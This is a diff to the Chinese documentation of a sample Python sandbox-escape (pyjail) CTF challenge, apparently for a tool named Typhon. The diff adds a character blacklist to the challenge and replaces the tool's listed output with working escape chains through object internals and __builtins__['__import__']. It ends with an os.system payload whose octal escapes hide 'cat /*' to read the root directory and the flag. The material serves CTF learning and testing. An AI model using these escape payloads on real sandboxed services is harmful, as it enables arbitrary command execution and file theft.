@@ -442,10 +442,10 @@ Typhon-Sample Pyjail 1
     if __name__ == '__main__':
         app.run(host='0.0.0.0',port=9000)
 
-这是一个由 `Flask <https://flask.org.cn/en/stable/>`_ 框架构建的 pyjail web 挑战。我们不难注意到，此题目唯一的 waf 是其对命名空间的限制：
+这是一个由 `Flask <https://flask.org.cn/en/stable/>`_ 框架构建的 pyjail web 挑战。我们不难注意到，此题目的 waf 有：
 
+- 对命名空间的限制
 .. code-block:: python
-    :linenos:
 
         whitelist = {
             "print": print,
@@ -455,6 +455,11 @@ Typhon-Sample Pyjail 1
         }
 
         safe_globals = {"__builtins__": whitelist}
+
+- 对 payload 的黑名单限制
+.. code-block:: python
+
+    blackchar = "&*^%#${}@!~`·/<>"
 
 由于这是一道web题目，我们不能控制程序的 stdin （即，类似于 ``input()`` , ``help()`` 的函数在此不适用）。因此，我们将 :attr:`~bypassRCE.interactive` 设置为 ``False``
 
@@ -473,6 +478,7 @@ Typhon-Sample Pyjail 1
                 "Exception": Exception,
             }
         },
+        banned_chr= "&*^%#${}@!~`·/<>",
         interactive=False,
     )
 
@@ -486,34 +492,34 @@ Typhon-Sample Pyjail 1
 
     directly input bypass(0 payload found): None
     generator(3 payloads found): (a for a in ()).gi_frame
-    type(2 payloads found): list.__class__
-    object(6 payloads found): {}.__class__.__mro__[1]
+    type(1 payload found): list.__class__
+    object(4 payloads found): "".__class__.__bases__[0]
     bytes(3 payloads found): list.__class__(''.encode())
-    builtins set(5 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']
+    builtins set(2 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']
     builtins module(0 payload found): None
-    import(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']
-    load_module(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__loader__'].load_module
-    modules(1 payload found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys').modules
-    os(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os')
-    subprocess(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('subprocess')
-    uuid(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('uuid')
-    pydoc(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('pydoc')
-    multiprocessing(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('multiprocessing')
-    builtins(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('builtins')
-    codecs(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('codecs')
-    warnings(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('warnings')
-    base64(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('base64')
-    importlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('importlib')
-    weakref(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('weakref')
-    reprlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('reprlib')
-    sys(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys')
-    linecache(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('linecache')
-    io(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('io')
-    ctypes(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('ctypes')
-    profile(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile')
-    timeit(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('timeit')
-    exec(32 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile').run
-    __import__2RCE(20 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')
+    import(6 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']
+    load_module(6 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__loader__'].load_module
+    modules(1 payload found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys').modules
+    os(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os')
+    subprocess(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('subprocess')
+    uuid(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('uuid')
+    pydoc(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('pydoc')
+    multiprocessing(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('multiprocessing')
+    builtins(4 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('builtins')
+    codecs(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('codecs')
+    warnings(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('warnings')
+    base64(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('base64')
+    importlib(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('importlib')
+    weakref(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('weakref')
+    reprlib(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('reprlib')
+    sys(4 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys')
+    linecache(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('linecache')
+    io(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('io')
+    ctypes(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('ctypes')
+    profile(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile')
+    timeit(3 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('timeit')
+    exec(32 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile').run
+    __import__2RCE(1251 payloads found): "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('\143\141\164 \57\52')
 
 
     -----------Progress-----------
@@ -522,10 +528,10 @@ Typhon-Sample Pyjail 1
     +++++++++++Jail broken+++++++++++
 
 
-    {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')
+    "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('\143\141\164 \57\52')
 
 
-    +++++++++++Jail broken+++++++++++
++++++++++++Jail broken+++++++++++
 
 使用上述 payload 读取根目录下所有文件（包含 ``/flag`` ）。
 
